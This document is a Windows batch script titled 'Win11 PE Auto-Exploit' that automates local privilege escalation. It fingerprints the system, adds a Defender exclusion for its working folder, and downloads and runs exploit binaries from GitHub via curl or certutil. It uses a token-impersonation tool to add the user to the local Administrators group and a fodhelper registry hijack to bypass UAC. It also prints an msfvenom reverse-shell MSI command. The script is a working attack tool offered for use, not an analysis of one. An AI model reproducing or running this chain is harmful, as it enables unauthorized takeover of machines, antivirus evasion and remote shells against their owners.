@echo off
setlocal EnableExtensions EnableDelayedExpansion
title Win11 PE Auto-Exploit
color 0B

set "WORK=%TEMP%\pes"
if not exist "%WORK%" mkdir "%WORK%" >nul 2>&1
cd /d "%WORK%" 2>nul

echo ============================================================
echo   Auto-fingerprint + local privilege escalation
echo   Order: Dark Elevator ^> RoguePlanet ^> GodPotato ^> UAC
echo ============================================================
echo.

whoami /groups 2>nul | findstr /i /c:"S-1-16-16384" >nul && (
    echo [=] Already SYSTEM. Nothing to do.
    goto :done
)

:: ---------------- fingerprint ----------------
set "BUILD=0"
set "UBR=0"
set "INSTALL=Unknown"
set "IL=Medium"
set "ISADMIN=no"
for /f "tokens=3" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber 2^>nul ^| findstr /i "CurrentBuildNumber"') do set "BUILD=%%A"
for /f "tokens=3" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v UBR 2^>nul ^| findstr /i "UBR"') do set /a UBR=%%A
for /f "tokens=3" %%A in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v InstallationType 2^>nul ^| findstr /i "InstallationType"') do set "INSTALL=%%A"
whoami /groups 2>nul | findstr /i /c:"S-1-16-12288" >nul && set "IL=High"
whoami /groups 2>nul | findstr /i /c:"S-1-5-32-544" >nul && set "ISADMIN=yes"

echo [*] User         : %USERNAME%
echo [*] Build        : %BUILD%.%UBR%
echo [*] Install type : %INSTALL%
echo [*] Integrity    : %IL%
echo [*] Administrators: %ISADMIN%
echo.

if %BUILD% LSS 19041 (
    echo [-] Unsupported Windows build.
    goto :done
)
if /i "%INSTALL%"=="Server" echo [~] Server detected - RoguePlanet PoC will not work here.
if /i "%ISADMIN%"=="yes" powershell -NoProfile -Command "Add-MpPreference -ExclusionPath '%WORK%'" >nul 2>&1

:: ---------------- 1. Dark Elevator (CVE-2026-50343) ----------------
echo [1] Dark Elevator - InstallService plugin map (CVE-2026-50343)
if %UBR% GEQ 8600 (
    echo     [~] UBR suggests July 2026+ patch. Trying anyway.
)
call :dl "https://raw.githubusercontent.com/califio/publications/main/MADBugs/windows-CVE-2026-50343/bin/isrun.exe" "isrun.exe"
if not exist "isrun.exe" (
    echo     [-] Download failed.
    goto :try_rogue
)
echo     Inside the shell: run  whoami  ^(expect nt authority\system^), then  exit.
start /wait "" "isrun.exe" shell
call :check
set /p "GOT_SYS=    Did you get a SYSTEM shell? [y/N] "
if /i "%GOT_SYS%"=="y" goto :done

:try_rogue
:: ---------------- 2. RoguePlanet (CVE-2026-50656) ----------------
echo.
echo [2] RoguePlanet - Defender engine link race (CVE-2026-50656)
if /i "%INSTALL%"=="Server" (
    echo     [-] Skipped: needs ISO mount.
    goto :try_potato
)
call :dl "https://raw.githubusercontent.com/MSNightmare/RoguePlanet/main/RoguePlanet.exe" "RoguePlanet.exe"
if not exist "RoguePlanet.exe" (
    echo     [-] Download failed.
    goto :try_potato
)
echo     Running - may take 30-90s and several attempts. A new window appears on success.
start /wait "" "RoguePlanet.exe"
call :check
set /p "GOT_RP=    Did a SYSTEM shell appear? [y/N] "
if /i "%GOT_RP%"=="y" goto :done

:try_potato
:: ---------------- 3. GodPotato (SeImpersonate) ----------------
echo.
echo [3] GodPotato - token impersonation
whoami /priv 2>nul | findstr /i "SeImpersonatePrivilege" >nul
if errorlevel 1 (
    echo     [-] SeImpersonatePrivilege not held. Skipped.
    goto :try_uac
)
call :dl "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" "GodPotato-NET4.exe"
if not exist "GodPotato-NET4.exe" (
    echo     [-] Download failed.
    goto :try_uac
)
echo     Adding %USERNAME% to local Administrators...
start /wait "" "GodPotato-NET4.exe" -cmd "cmd /c net localgroup administrators %USERNAME% /add"
call :check
if "%GOT%"=="1" (
    echo [=] %USERNAME% added to Administrators. Log off and back on to use it.
    goto :done
)

:try_uac
:: ---------------- 4. UAC bypass (admin but medium IL) ----------------
echo.
echo [4] UAC bypass - fodhelper registry hijack
if /i not "%ISADMIN%"=="yes" (
    echo     [-] Not in Administrators group. Skipped.
    goto :try_aie
)
if /i "%IL%"=="High" (
    echo     [-] Already high integrity. Skipped.
    goto :try_aie
)
> "%WORK%\p.bat" echo @echo off
>> "%WORK%\p.bat" echo start "" cmd.exe
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "%WORK%\p.bat" /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f >nul 2>&1
echo     Launching fodhelper...
start "" fodhelper.exe
timeout /t 4 /nobreak >nul
reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
echo     Check the new window:  whoami /groups ^| findstr 12288
set /p "GOT_UAC=    Elevated prompt appeared? [y/N] "
if /i "%GOT_UAC%"=="y" goto :done

:try_aie
:: ---------------- 5. AlwaysInstallElevated ----------------
echo.
echo [5] AlwaysInstallElevated
set "A1="
set "A2="
for /f "tokens=3" %%A in ('reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2^>nul ^| findstr /i "AlwaysInstallElevated"') do set "A1=%%A"
for /f "tokens=3" %%A in ('reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated 2^>nul ^| findstr /i "AlwaysInstallElevated"') do set "A2=%%A"
if "%A1%%A2%"=="0x10x1" (
    echo     [!] Enabled. Build an MSI and run it:
    echo         msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOU LPORT=443 -f msi -o p.msi
    echo         msiexec /quiet /qn /i p.msi
) else (
    echo     [-] Not enabled.
)

:done
echo.
echo ============================================================
echo   Build %BUILD%.%UBR%  ^|  Integrity %IL%
echo   Working files kept in: %WORK%
echo   Re-run this after a reboot if a patch landed mid-way.
echo ============================================================
endlocal
pause
exit /b

:check
set "GOT=0"
net localgroup administrators 2>nul | findstr /i /c:"%USERNAME%" >nul && set "GOT=1"
exit /b 0

:dl
curl.exe -s -L --max-time 60 -o "%~2" "%~1" >nul 2>&1
if exist "%~2" exit /b 0
certutil -urlcache -split -f "%~1" "%~2" >nul 2>&1
exit /b 0